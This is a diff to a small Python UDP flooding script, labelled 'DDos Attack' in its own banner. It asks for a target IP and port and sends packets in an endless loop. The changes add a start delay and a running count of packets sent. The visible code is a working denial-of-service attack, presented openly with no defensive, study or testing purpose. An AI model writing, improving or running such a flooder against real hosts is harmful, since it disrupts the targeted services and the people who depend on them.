@@ -2,7 +2,7 @@ import socket
 import os
 import sys
 import random
-
+import time
 from datetime import datetime
 
 
@@ -26,10 +26,16 @@ else :
 port = int(input("Port you want to attack: "))
 pers_msg = input("Enter your personnal message or signatur if you wish: ")
 
-print(ip)
 
 os.system("clear")
 os.system("figlet 'DDos Attack starting ...'")
+
+print("preparing the attacl of the adress IP:",ip )
+time.sleep(5)
+sent = 0
+
 while True:
     sockt.sendto(bytes,(ip,port))
     #sockt.send(bytes(pers_msg))
+    sent +=1
+    print("number of request sent:",sent)
